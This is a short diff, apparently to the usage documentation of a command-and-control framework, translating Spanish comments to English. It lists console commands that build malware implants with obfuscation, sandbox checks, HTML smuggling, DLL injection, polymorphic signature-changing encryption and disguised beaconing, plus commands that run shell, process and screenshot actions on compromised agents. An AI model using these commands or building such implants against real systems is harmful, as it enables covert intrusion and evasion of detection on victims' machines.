   c2> build http 192.168.1.10                    ← exe + shellcode
   c2> build mtls 10.0.0.1 60 20 garble sandbox  ← obfuscated + checks
   c2> build http 10.0.0.1 60 20 format=html     ← html smuggling
   c2> build http 10.0.0.1 60 20 format=dll inject=fiber
   c2> build http 10.0.0.1 60 20 encrypt=aes kill-date=2026-12-31
-  c2> build http 10.0.0.1 60 20 encrypt=poly            ← polymorphic stub, firma diferente cada build
+  c2> build http 10.0.0.1 60 20 encrypt=poly            ← polymorphic stub, different signature each build
   c2> build http 10.0.0.1 60 20 os=linux arch=arm64
   c2> build http 10.0.0.1 60 20 user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" beacon-uris=/search,/api/v1/data
   c2> build http 10.0.0.1 60 20 proxy=http://corp-proxy:8080 working-hours=09:00-17:00
   c2> build http 10.0.0.1 60 20 http-headers="X-Cache-ID:abc;Cookie:session=xyz"
-  c2> jobs                                       ← ver listeners
-  c2> agents                                     ← ver agentes
-  c2> use <TAB>                                  ← seleccionar agente
+  c2> jobs                                       ← view listeners
+  c2> agents                                     ← view agents
+  c2> use <TAB>                                  ← select agent
   c2 [abc12345]> shell whoami
   c2 [abc12345]> ps
   c2 [abc12345]> screenshot
